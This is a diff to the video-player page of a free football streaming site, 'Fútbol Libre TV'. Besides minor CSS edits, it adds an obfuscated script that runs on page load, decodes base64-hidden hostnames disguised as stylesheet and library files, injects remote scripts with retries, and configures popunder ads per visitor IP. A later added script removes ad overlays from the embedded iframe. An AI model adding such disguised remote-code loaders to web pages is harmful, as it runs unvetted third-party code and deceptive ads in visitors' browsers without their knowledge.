@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <link rel="icon" href="faviconnuevo.png" type="image/png" />
-   <meta property="og:title" content="Reproductor | Fútbol Libre TV" />
+  <meta property="og:title" content="Reproductor | Fútbol Libre TV" />
   <meta property="og:description" content="Mira partidos de fútbol online gratis en HD desde tu navegador. ¡Fácil, rápido y sin interrupciones!" />
   <meta property="og:image" content="https://tse2.mm.bing.net/th/id/OIP.8kYsoIrIc4xDvEghq0zMowAAAA?pid=ImgDetMain" />
   <meta property="og:type" content="website" />
@@ -26,8 +26,8 @@
       padding: 0;
       height: 100%;
       background-color: black;
+      overflow: hidden; /* Evita barras de scroll innecesarias */
     }
-
     iframe {
       width: 100%;
       height: 100%;
@@ -38,30 +38,32 @@
       border-bottom: 1px solid #333;
       color: #fff;
     }
-
     body.modo-oscuro a {
       color: #fff;
     }
-
     body.modo-oscuro .boton {
       background: #15803d;
       color: #fff;
     }
-
     body.modo-oscuro .boton:hover {
       background: #1ed760;
     }
-
     body.modo-oscuro footer {
       background-color: #000;
       color: #fff;
     }
-
     body.modo-oscuro iframe {
       box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
     }
   </style>
+
+  <script type="text/javascript" data-cfasync="false">
+  /*<![CDATA[/* */
+  (function(){var v=window,k="f92b6767c12ccc463d8c9957d00b097e",h=[["siteId",227+930+959+499+5227894],["minBid",0],["popundersPerIP","2:3,2:12"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],j=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9nZGVjay5jb3JlLm1pbi5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQveUhFL3Vhbmd1bGFyLWltZ2NhY2hlLm1pbi5qcw=="],l=-1,y,n,m=function(){clearTimeout(n);l++;if(j[l]&&!(1781745191000<(new Date).getTime()&&1<l)){y=v.document.createElement("script");y.type="text/javascript";y.async=!0;var e=v.document.getElementsByTagName("script")[0];y.src="https://"+atob(j[l]);y.crossOrigin="anonymous";y.onerror=m;y.onload=function(){clearTimeout(n);v[k.slice(0,16)+k.slice(0,16)]||m()};n=setTimeout(m,5E3);e.parentNode.insertBefore(y,e)}};if(!v[k]){try{Object.freeze(v[k]=h)}catch(e){}m()}})();
+  /*]]>/* */
+  </script>
 </head>
+
 <body>
   <iframe id="videoFrame" allowfullscreen></iframe>
 
@@ -82,5 +84,38 @@
       document.body.innerHTML = "<h2 style='color:white;text-align:center;margin-top:20px;'>No se encontró el parámetro de video</h2>";
     }
   </script>
+
+  <script>
+    const videoIframe = document.getElementById('videoFrame');
+
+    function buscarYDestruirOverlay() {
+      try {
+        const iframeDocument = videoIframe.contentWindow.document;
+        const todosLosDivs = iframeDocument.getElementsByTagName('div');
+
+        for (let i = 0; i < todosLosDivs.length; i++) {
+          const div = todosLosDivs[i];
+          // getComputedStyle nos da los estilos reales que se están aplicando al elemento
+          const estilo = window.getComputedStyle(div);
+
+          // La condición mágica: si un div está "flotando" (absolute) y está muy por encima de todo (z-index alto)...
+          if (estilo.position === 'absolute' && parseInt(estilo.zIndex, 10) > 100000) {
+            console.log('¡Capa de anuncio encontrada y eliminada!', div);
+            // ...lo eliminamos por completo para que no moleste.
+            div.remove();
+          }
+        }
+      } catch (error) {
+        // Es normal que este error aparezca a veces por seguridad, el script lo seguirá intentando.
+      }
+    }
+
+    // Cuando el iframe termine de cargar su contenido...
+    videoIframe.onload = function() {
+      // ...iniciamos un vigilante que revisará cada medio segundo si ha aparecido una capa de anuncio.
+      setInterval(buscarYDestruirOverlay, 500);
+    };
+  </script>
+
 </body>
 </html>
